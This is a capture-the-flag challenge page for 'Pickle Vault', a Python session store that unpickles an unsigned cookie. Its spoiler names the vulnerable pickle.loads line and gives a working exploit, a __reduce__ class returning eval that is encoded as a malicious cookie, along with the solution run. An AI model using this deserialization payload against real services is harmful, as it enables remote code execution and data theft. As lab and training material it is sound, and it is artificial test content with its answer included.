# w14 :: Pickle Vault

- **Category:** Pwn
- **Difficulty:** medium
- **Stack:** Python 3.12 / stdlib only (no third-party packages)
- **URL:** http://localhost:30014

## Brief

PICKLE VAULT is a stateless session store. Your dashboard state — username,
theme, and the messages pinned to your panel — travels entirely in the
`vault_session` cookie. The server base64-decodes the cookie and rebuilds your
session from it, then reflects that object back at `/api/session`.

The vault itself is sealed. `GET /api/vault` only ever says `vault: locked`, and
the secret lives in `app/vault.py`, which is `chmod 0400` inside the container.
Reading it from disk is not the path.

## Goal

Get code execution through the session cookie and read the flag out of the
running process. Submit it.

## Hint

`pickle` is not a data format. It is a small virtual machine, and its opcode set
includes `REDUCE` — "call this callable with these arguments". Look at what
happens to the object `pickle.loads()` hands back, and at where `messages` ends
up in the response.

A benign cookie mints fine at boot and is printed on the landing page. Start by
decoding it.

<details>
<summary>Spoiler</summary>

The vulnerable line is in `app/server.py`, `Handler._session()`:

```python
session = pickle.loads(data)
```

No signature, no HMAC, no `pickle.Unpickler` subclass restricting `find_class` —
the raw bytes of a cookie become a live object graph.

Build a class whose `__reduce__` returns the REDUCE gadget. It runs *inside the
server process*, so it can ask for the module the server already imported:

```python
import base64, pickle

class RCE:
    def __reduce__(self):
        return (eval, ("__import__('vault').VAULT_FLAG",))

print(base64.b64encode(pickle.dumps(RCE())).decode())
```

The handler reflects the object `pickle.loads()` produced, so the returned
string lands in `session.messages` in the JSON response:

```bash
python solution/exploit.py
# [+] FLAG: hex4b0t{...}
```

`solution/probe.sh` asserts the vault does not leak directly, that a benign
cookie still deserializes, and that the malicious one executes.

</details>
